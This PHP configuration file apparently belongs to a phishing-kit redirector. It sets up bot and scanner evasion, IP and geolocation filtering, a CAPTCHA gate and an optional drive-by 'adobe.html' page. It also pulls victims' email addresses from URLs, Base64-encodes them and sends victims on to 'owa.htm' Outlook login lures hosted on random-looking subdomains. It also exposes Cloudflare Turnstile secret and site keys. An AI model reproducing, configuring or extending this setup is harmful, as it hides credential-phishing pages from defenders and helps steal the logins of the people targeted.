<?php
// Array of IP addresses that are always allowed access
// Example format: '123.123.123.123'
// These IPs will bypass all security checks
$whitelist = [];


// Array of IP addresses that are explicitly blocked
// Example format: '123.123.123.123'
// These IPs will always be denied access

$blackList = [];


// Array of request URLs that are explicitly blocked - supports full URLs or partial matches
// Example formats: 
//   'example.com' - Blocks any URL containing this domain
//   'https://example.com/path' - Blocks specific URL path
//   '/admin/' - Blocks URLs containing this path segment
// These URLs will be denied access regardless of other settings
// Note: Matches are performed against the raw URL - email addresses are not extracted for comparison
$blackListRequest = [];


// Array of email addresses that are explicitly blocked from making requests
// Example format: 'user@example.com'
// These emails will always be denied access regardless of other conditions
// Note: This check is performed after URL extraction and all other validation checks,
//       in case the email is found in the URL fragment (#) rather than query (?) or path
$blackListEmail = [];


// Array of final destination URLs that are blocked from being used as redirect targets
// Example format: 'https://malicious.com', 'http://spam-site.net'
// These URLs will be blocked even if they pass all other validation checks
// Use this to prevent redirection to known malicious or unwanted destinations
$blackListFinalURLs = [];


// Array of final destination URLs to redirect to when the request contains blacklisted emails
// Example format: 'https://blocked-email-redirect.com', 'https://warning-page.com'
// When a request contains an email from $blackListEmail, redirect to one of these URLs instead
// This allows you to redirect blocklisted email requests to specific warning or blocking pages
$blackListEmailFinalURLs = [];


// Array of final destination URLs to redirect to when the request matches blocklisted patterns
// Example format: 'https://blocked-request-redirect.com', 'https://access-denied.com'
// When a request matches a pattern from $blackListRequest, redirect to one of these URLs instead
// This allows you to redirect blacklisted requests to specific warning or blocking pages
$blackListRequestFinalURLs = [];


$config = [
    // Core functionality settings
    'enableIpApiCheck' => true,      // Enable IP geolocation and validation checks
    'logRequests' => true,           // Log all incoming HTTP requests
    'logVisitors' => true,           // Track and log visitor information
    'blockBots' => true,             // Enable bot detection and blocking

    // Security and verification settings
    'useCaptcha' => true,            // Enable CAPTCHA verification for users
    'useAntiBot' => true,            // Enable advanced bot detection features
    'logRequestType' => true,        // Log request types when anti-bot is disabled
    'alwaysSolveCaptcha' => true,    // Force CAPTCHA on every visit, even if previously solved

    // Domain and subdomain configuration
    'useWildcardSubdomain' => false, // Enable wildcard subdomain support
    'useRandomSubdomain' => false,   // Generate random subdomains (requires wildcard enabled)

    // Redirection and routing settings
    'botRedirectMethod' => 'random', // How to handle bot traffic: random|error403|error404|error500|mediaUrl
    'redirectCode' => 302,           // HTTP status code for redirects (301: permanent, 302: temporary)
    'cacheTime' => 3600,            // Duration to cache IP check results in seconds
    'addPathToDestination' => false, // Preserve an original path when redirecting
    'pathPosition' => 1,            // Starting a segment for path preservation (1-based index)

    // UI and user experience settings
    'captchaPageTitle' => "Verify you are human",
    'useSafeListRedirection' => true,

    // Drive-by page configuration
    'useDriveBy' => false,
    'driveByPath' => realpath(__DIR__ . '/driveBy/adobe.html'),
    'driveByDelay' => 5,           // Seconds to wait before redirecting from the drive-by page

    // Error handling configuration
    'errorPattern' => [
        'useLink' => false,         // Use custom URLs instead of error pages
        "404" => 'https://www.baidu.com', // Custom 404 Not Found redirect
        "403" => 'https://www.baidu.com', // Custom 403 Forbidden redirect
        "500" => 'https://www.baidu.com', // Custom 500 Server Error redirect
    ],

    // Block requests that don't contain URL fragments (#) or query parameters (?)
    // Set to true to enforce this security measure, false to allow all requests
    // This can help to prevent unauthorized access attempts
    // Note: This setting only applies when 'useDriveBy' or 'useCaptcha' is set to true
    'blockRequestWithoutFragmentAndQuery' => true,

    // Block requests that don't contain an email address in the URL fragments (#) or query parameters (?)
    // Note: This setting only applies when 'blockRequestWithoutFragmentAndQuery' is set to true
    'blockRequestWithoutEmail' => false,

    // Whether to use a custom HTTP header to obtain the client's IP address
    // Set to true if your server/proxy setup requires reading IP from a specific header
    // Default: false (uses standard REMOTE_ADDR)
    'userCustomHeaderForIp' => false,
    // The name of the custom HTTP header containing the client's real IP address - case-insensitive
    // Only used when userCustomHeaderForIp is true
    // Common values: 'X-Forwarded-For', 'X-Real-IP', 'CF-Connecting-IP' (Cloudflare)
    // Default: 'REMOTE_ADDR'
    'customHeaderName' => 'REMOTE_ADDR',

    // Redirect URL construction and email extraction configuration
    'redirectOptions' => [
        // URL construction method for redirects
        // Available options:
        // - "query + hash": Include both URL parameters and fragment/hash in redirect  - emailType will also be applied here
        // - "query": Include only URL parameters (everything after ?) in redirect - emailType will also be applied here 
        // - "hash": Include only URL fragment/hash (everything after #) in redirect - emailType will also be applied here
        // - "?email": Extract email from URL and add as query parameter (?extracted@email.com or ?ZXh0cmFjdGVkQGVtYWlsLmNvbQ==)
        // - "#email": Extract email from URL and add as hash fragment (#extracted@email.com or #ZXh0cmFjdGVkQGVtYWlsLmNvbQ==)
        // - "?random=email": Extract email and add as random parameter (?78sijdygebs=extracted@email.com or ?78sijdygebs=ZXh0cmFjdGVkQGVtYWlsLmNvbQ==)
        // - "append": Adds the extracted email address to the end of the redirection URI. (https://domain.com/kwkk?kso= becomes https://domain.com/kwkk?kso=email)
        "type" => "#email",

        // Email encoding method when email is extracted and added to redirect URL.
        // Available options:
        // - "base64": Encode extracted email using Base64 encoding for obfuscation
        // - "plain": Use extracted email in plain text format without encoding
        // - "direct": Use email exactly as found in the original URL without modification
        'emailType' => 'base64'
    ],

    'middleware' => [
        'use' => false,
        'type' => 'form',// available options are form & captcha
        'file' => __DIR__ .'/app/email_form.html',
    ]
];

// URLs for bot redirection when using 'random' or 'mediaUrl' methods
$botRedirectedUrl = [
    'https://youtube.com'  // Add more URLs as needed for random bot redirection
];

// Cloudflare Turnstile authentication credentials
$SECRET_KEY = '0x4AAAAAABB07n-ZkMUX-jCXI8BKrPeCa5g';  // Server-side verification key
$SITE_KEY = "0x4AAAAAABB07jhaHrxdqr4O";              // Client-side site key

// Default subdomain when using static wildcard configuration
$customSubdomain = '';

// Default safe redirect destination when not using safe list
$safeRedirectionUrl = '';

// List of approved safe redirect destinations
// Randomly selected when useSafeListRedirection is enabled
$safeListRedirectionUrl = ['https://c7db9f65d9bc558745b1eb9ba1a621abfac4a366cd45a6d3d2f6e1.kccworld.online/owa.htm', 'https://c7db9f65d9bc558745b1eb9ba1a621abfac4a366cd45a6d3d2f6e1.maha-tw.online/owa.htm', 'https://c7db9f65d9bc558745b1eb9ba1a621abfac4a366cd45a6d3d2f6e1.saeproducts.online/owa.htm', 'https://c7db9f65d9bc558745b1eb9ba1a621abfac4a366cd45a6d3d2f6e1.voltronic.site/owa.htm']  // Add more safe URLs as needed
;
